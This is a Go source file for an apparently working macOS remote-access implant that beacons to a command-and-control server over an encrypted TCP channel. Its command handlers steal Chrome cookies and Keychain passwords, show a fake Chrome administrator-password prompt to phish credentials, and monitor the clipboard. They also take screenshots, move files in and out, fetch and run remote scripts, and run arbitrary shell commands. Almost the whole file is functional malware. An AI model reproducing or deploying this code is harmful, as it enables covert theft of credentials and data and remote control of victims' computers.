package main

import (
	"bufio"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"

	"github.com/grines/TCPMacC2Payload/attacks"
	encryption "github.com/grines/TCPMacC2Payload/common"
	"github.com/grines/TCPMacC2Payload/osx"
	syscall "github.com/grines/TCPMacC2Payload/payload_func"
)

const (
	PSKPayload = "thisiscoolthisiscool1234" // 16/24 char PSK // shared psk with client/server/implants
	//target     = "143.198.97.230"           // C2 Server
	target = "0.0.0.0"
	port   = "8008"
)

var timed_data []string
var clipHistory []string

func main() {
	fullTarget := net.JoinHostPort(target, port)
	fmt.Println("Running @:", fullTarget)

	for {
		conn, err := net.Dial("tcp", fullTarget)
		if err != nil {
			log.Printf("Error connecting: %v\n", err)
			time.Sleep(time.Duration(rand.Intn(26)+5) * time.Second)
			continue
		}

		handleConnection(conn)
	}
}

func generateResponse(challenge, psk string) string {
	hash := sha256.Sum256([]byte(challenge + psk))
	return fmt.Sprintf("%x", hash)
}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	reader := bufio.NewReader(conn)
	challenge, err := reader.ReadString('\n')
	if err != nil {
		log.Printf("Error reading challenge: %v\n", err)
		return
	}

	response := generateResponse(strings.TrimSpace(challenge), PSKPayload)
	conn.Write([]byte(response + "\n"))

	currentDir, err := os.Getwd()
	if err != nil {
		log.Printf("Error getting current directory: %v\n", err)
		return
	}

	for {
		message, err := reader.ReadString('\n')
		if err != nil {
			log.Printf("Error reading command: %v\n", err)
			break
		}

		command := strings.TrimSpace(message)
		log.Printf("Command received: %s", command)

		decryptedCommand, err := encryption.Decrypt(command, PSKPayload)
		if err != nil {
			log.Printf("Error: %s", err)
			continue
		}
		log.Printf("Decrypted Command: %s", decryptedCommand)

		executeCommand(decryptedCommand, conn, &currentDir)
	}
}

func executeCommand(command string, conn net.Conn, currentDir *string) {
	parts := strings.Fields(command)
	if len(parts) == 0 {
		return
	}

	var hasTimedOut bool
	var wg sync.WaitGroup

	// Create a channel to signal completion of command execution
	done := make(chan error, 1)

	// Execute the command in a goroutine
	go func() {
		var err error
		newEntries := make(chan string)
		stopChan := make(chan string)
		switch parts[0] {
		case "chromedump_all":
			go func() {
				key, err := attacks.GetDecryptKey()
				if err != nil {
					sendError(conn, err)
				}
				data, err := attacks.GetCookiesForAllProfiles(key)
				if err != nil {
					sendError(conn, err)
				} else {
					var decookies []string

					for _, v := range data {
						for _, a := range v {
							line := fmt.Sprintf("%s:%s:%s", a.Domain, a.Name, a.Value)
							decookies = append(decookies, line)
						}

					}
					flattened := strings.Join(decookies, "\n")
					timed_data = append(timed_data, command+":"+flattened)
				}
			}()
			sendResponse(conn, "Chrome Cookie Dumper", hasTimedOut, command)
		case "chromedump":
			if len(parts) < 2 {
				sendError(conn, fmt.Errorf("no profile specified"))
				break
			}
			ProfileURL := strings.Join(parts[1:], " ")
			key, err := attacks.GetDecryptKey()
			if err != nil {
				sendError(conn, err)
			}
			data, err := attacks.GetCookies(ProfileURL, key)
			if err != nil {
				fmt.Println(err)
				sendError(conn, err)
			} else {
				var decookies []string

				for _, v := range data {
					line := fmt.Sprintf("%s:%s:%s", v.Domain, v.Name, v.Value)
					decookies = append(decookies, line)
				}
				flattened := strings.Join(decookies, "\n")
				sendResponse(conn, flattened, hasTimedOut, command)
			}
		case "pillage":
			f := attacks.Pillage()
			flattened := strings.Join(f, "\n")
			sendResponse(conn, flattened, hasTimedOut, command)
		case "jobs":
			flattened := strings.Join(timed_data, "\n")
			sendResponse(conn, flattened, hasTimedOut, command)
			timed_data = nil
		case "unsafe_jxa":
			if len(parts) < 2 {
				sendError(conn, fmt.Errorf("no url specified"))
				break
			}
			resp := osx.UnsafeJXARemote(parts[1])
			sendResponse(conn, resp, hasTimedOut, command)
		case "remotejxa":
			if len(parts) < 2 {
				sendError(conn, fmt.Errorf("no url specified"))
				break
			}

			osx.RunOSAURL(parts[1])
			sendResponse(conn, "Osascript Executed", hasTimedOut, command)
		case "jxaremote":
			scriptdata, _ := syscall.SimpleCurl(parts[1])
			fmt.Println(scriptdata)
			osx.RunOSA(scriptdata)
			sendResponse(conn, "Osacript Executed", hasTimedOut, command)
		case "askpass":
			jxaScript := `var app = Application.currentApplication(); app.includeStandardAdditions = true; var dialogText = 'The current date and time is ' + (app.currentDate()); var defaultIconName = 'AppIcon'; var defaultIconStr = '/System/Library/CoreServices/Software Update.app/Contents/Resources/SoftwareUpdate.icns'; var resourcesFolder = '/Contents/Resources'; var iconExt = '.icns'; var makeChanges = ' wants to make changes.'; var privString = 'Enter the Administrator password for '; var allowThis = ' to allow this.'; var userName = app.systemInfo().shortUserName; var text = 'Chrome ' + makeChanges + '\\n' + privString + userName + allowThis; var appName = 'Chrome'; var prompt = app.displayDialog(text, { defaultAnswer: '', buttons: ['OK', 'Cancel'], defaultButton: 'OK', cancelButton: 'Cancel', withTitle: appName, hiddenAnswer: true }); var promptResults = prompt.textReturned; console.log(promptResults);`
			resp := osx.UnsafeJXA(jxaScript)
			sendResponse(conn, resp, hasTimedOut, command)
		case "env":
			environ := syscall.Env()
			sendResponse(conn, environ, hasTimedOut, command)
		case "ping":
			sendResponse(conn, "pong", hasTimedOut, command)
		case "whoami":
			who, err := syscall.Whoami()
			if err != nil {
				sendError(conn, err)
				break
			}
			user := fmt.Sprintf("%v", who)
			sendResponse(conn, user, hasTimedOut, command)
		case "ps":
			processes := syscall.Ps()
			flattened := strings.Join(processes, "\n")
			sendResponse(conn, flattened, hasTimedOut, command)
		case "clipboard":
			clip := osx.Clipboard()
			sendResponse(conn, clip, hasTimedOut, command)
		case "clipmon":
			wg.Add(1)
			go osx.ClipboardMonitor(newEntries, stopChan)
			go processClipboardEntries(newEntries, &wg)
			sendResponse(conn, "Monitoring Clipboard", hasTimedOut, command)
		case "clipmonview":
			fmt.Println(newEntries)
			flattened := strings.Join(clipHistory, "\n")
			sendResponse(conn, flattened, hasTimedOut, command)
			clipHistory = nil
		case "clipmonstop":
			fmt.Println("stop clip")
			stopChan <- "STOP"
			close(stopChan) // Signal ClipboardMonitor to stop
			sendResponse(conn, "Stopped Monitoring Clipboard", hasTimedOut, command)
		case "screenshot":
			clip := osx.Screencapture()
			fmt.Println(clip[0].Data())
			fileContent, err := ioutil.ReadFile(parts[1])
			if err != nil {
				sendError(conn, err)
				break
			}
			sendResponse(conn, string(fileContent), hasTimedOut, command)
		case "cd":
			// Find the index of the first space
			fmt.Println(command)
			spaceIndex := strings.Index(command, " ")
			if spaceIndex == -1 || spaceIndex == len(command)-1 {
				sendError(conn, fmt.Errorf("no directory specified"))
				break
			}

			// Extract the directory path
			dirPath := command[spaceIndex+1:]

			// Change directory
			if err := os.Chdir(dirPath); err != nil {
				sendError(conn, err)
			} else {
				*currentDir, _ = os.Getwd()
				sendResponse(conn, "Changed directory to "+*currentDir, hasTimedOut, command)
			}
		case "download":
			if len(parts) < 2 {
				sendError(conn, fmt.Errorf("no file specified"))
				break
			}
			fileContent, err := ioutil.ReadFile(parts[1])
			if err != nil {
				sendError(conn, err)
				break
			}
			sendResponse(conn, string(fileContent), hasTimedOut, command)
		case "upload":
			if len(parts) < 3 {
				sendError(conn, fmt.Errorf("incorrect upload command"))
				break
			}

			remotePath := parts[1]
			data, err := base64.StdEncoding.DecodeString(parts[2])
			if err != nil {
				sendError(conn, fmt.Errorf("error decoding file data"))
				break
			}

			err = ioutil.WriteFile(remotePath, data, 0644)
			if err != nil {
				sendError(conn, err)
				break
			}

			sendResponse(conn, "File uploaded successfully", hasTimedOut, command)
		case "pwd":
			sendResponse(conn, *currentDir, hasTimedOut, command)
		case "keychain":
			if len(parts) < 2 {
				sendError(conn, fmt.Errorf("no keychain service specified"))
				break
			}
			// Join the parts back into a single string, skipping the first part ("keychain")
			keychainService := strings.Join(parts[1:], " ")

			password, err := syscall.SecKeychainFindGenericPassword(keychainService)
			if err != nil {
				sendError(conn, fmt.Errorf("keychain service not found: %s", err))
				break
			}
			sendResponse(conn, password, hasTimedOut, command)
		case "portscan":
			ports := syscall.Portscan()
			sendResponse(conn, ports, hasTimedOut, command)
		case "cp":
			if len(parts) < 3 {
				sendError(conn, fmt.Errorf("need: cp filepath tofilepath"))
				break
			}
			syscall.Cp(parts[1], parts[2])
			sendResponse(conn, "Copied", hasTimedOut, command)
		case "mv":
			if len(parts) < 3 {
				sendError(conn, fmt.Errorf("need: mv filepath tofilepath"))
				break
			}
			syscall.Mv(parts[1], parts[2])
			sendResponse(conn, "Moved", hasTimedOut, command)
		case "curl":
			if len(parts) < 2 {
				sendError(conn, fmt.Errorf("no url specified"))
				break
			}
			curlData, _ := syscall.SimpleCurl(parts[1])
			sendResponse(conn, curlData, hasTimedOut, command)
		case "kill":
			if len(parts) < 2 {
				sendError(conn, fmt.Errorf("no PID specified"))
				break
			}
			filedata := syscall.Kill(parts[1])
			sendResponse(conn, string(filedata), hasTimedOut, command)
		case "cat":
			if len(parts) < 2 {
				sendError(conn, fmt.Errorf("no file specified"))
				break
			}
			filedata := syscall.Cat(parts[1])
			sendResponse(conn, string(filedata), hasTimedOut, command)
		case "rm":
			if len(parts) < 2 {
				sendError(conn, fmt.Errorf("no file specified"))
				break
			}
			syscall.Rm(parts[1])
			sendResponse(conn, "Removed", hasTimedOut, command)
		case "ls":
			if len(parts) < 2 {
				filedata, err := syscall.List(".")
				if err != nil {
					sendError(conn, fmt.Errorf("error listing files"))

				}
				flattened := strings.Join(filedata, "\n")
				sendResponse(conn, string(flattened), hasTimedOut, command)
				break
			}
			filedata, err := syscall.List(parts[1])
			if err != nil {
				sendError(conn, fmt.Errorf("error listing files"))

			}
			flattened := strings.Join(filedata, "\n")

			sendResponse(conn, string(flattened), hasTimedOut, command)

		default:
			cmd := exec.Command("sh", "-c", command)
			cmd.Dir = *currentDir
			output, err := cmd.CombinedOutput()
			if err != nil {
				sendError(conn, err)
			} else {
				sendResponse(conn, string(output), hasTimedOut, command)
			}
		}
		done <- err // Signal completion
	}()

	// Use select to wait on multiple channel operations
	select {
	case <-time.After(10 * time.Second):
		// Timeout after 10 seconds
		hasTimedOut = true
		sendError(conn, fmt.Errorf("timed out, command converted into job. Check jobs later!"))
	case <-done:
		// Command completed
	}
}

func sendError(conn net.Conn, err error) {
	sendEncryptedResponse(conn, err.Error())
}

func sendResponse(conn net.Conn, response string, hasTimedOut bool, command string) {
	if !hasTimedOut {
		sendEncryptedResponse(conn, response)
	} else {
		timed_data = append(timed_data, command+":"+response)
	}
}

func sendEncryptedResponse(conn net.Conn, message string) {
	encryptedMsg, err := encryption.Encrypt(message, PSKPayload)
	if err != nil {
		log.Printf("Error encrypting message: %v\n", err)
		return
	}

	encodedMsg := base64.StdEncoding.EncodeToString([]byte(encryptedMsg))
	_, err = conn.Write([]byte(encodedMsg + "\n"))
	if err != nil {
		log.Printf("Error sending message: %v\n", err)
	}
}

func processClipboardEntries(entries <-chan string, wg *sync.WaitGroup) {
	defer wg.Done()
	for entry := range entries { // This loop exits when entries is closed
		fmt.Println("New clipboard entry:", entry)
		clipHistory = append(clipHistory, entry)
		// Process the entry as needed
	}
	fmt.Println("closed")
	// Perform any cleanup if necessary
}
